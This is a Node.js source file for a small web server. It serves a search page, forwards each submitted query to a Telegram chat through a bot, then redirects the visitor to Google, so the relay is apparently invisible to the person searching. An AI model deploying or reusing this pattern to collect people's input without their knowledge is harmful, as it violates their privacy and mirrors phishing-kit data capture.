'use strict';

require('dotenv').config();

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URLSearchParams } = require('url');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = parseInt(process.env.PORT || '3000', 10);

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('[ERROR] TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set in .env');
  process.exit(1);
}

const HTML_PATH = path.join(__dirname, 'public', 'index.html');

function sendTelegram(text) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ chat_id: CHAT_ID, text });

    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
      },
      (res) => {
        res.resume();
        if (res.statusCode !== 200) {
          console.warn(`[Telegram] Non-200 response: ${res.statusCode}`);
        }
        resolve();
      }
    );

    req.on('error', (err) => {
      console.error('[Telegram] Error:', err.message);
      resolve();
    });

    req.setTimeout(5000, () => {
      console.warn('[Telegram] Timeout');
      req.destroy();
      resolve();
    });

    req.write(body);
    req.end();
  });
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 8192) {
        req.destroy();
        reject(new Error('Body too large'));
      }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function serveIndex(res) {
  fs.readFile(HTML_PATH, (err, data) => {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Internal Server Error');
      return;
    }
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store',
    });
    res.end(data);
  });
}

const server = http.createServer(async (req, res) => {
  const { method, url } = req;

  if (method === 'GET' && (url === '/' || url === '/index.html')) {
    return serveIndex(res);
  }

  if (method === 'POST' && url === '/search') {
    let query = '';
    try {
      const raw = await readBody(req);
      const params = new URLSearchParams(raw);
      query = (params.get('q') || '').trim();
    } catch (err) {
      console.error('[Server] Body parse error:', err.message);
    }

    if (query) {
      sendTelegram(query).catch(() => {});
    }

    const googleUrl =
      'https://www.google.com/search?' +
      new URLSearchParams({ q: query }).toString();

    res.writeHead(302, { Location: googleUrl });
    res.end();
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`[Server] Listening on http://localhost:${PORT}`);
});
